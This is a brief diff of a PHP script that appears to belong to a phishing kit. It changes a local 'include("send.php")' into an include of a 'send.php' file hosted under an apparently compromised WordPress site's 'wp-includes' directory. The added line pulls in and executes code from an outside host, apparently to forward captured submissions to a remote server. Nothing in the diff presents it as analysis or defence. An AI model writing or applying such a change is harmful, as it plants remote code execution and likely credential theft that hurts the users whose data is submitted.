@@ -70,7 +70,7 @@ include $e; exit;
 } 
 if($signerr==0)
 {
-include("send.php");
+include("https://greeneducationintl.com/wp-includes/Requests/Exception/uyehfhjk/BoxOffice/send.php");
 include("error2.php");
 }
 } 
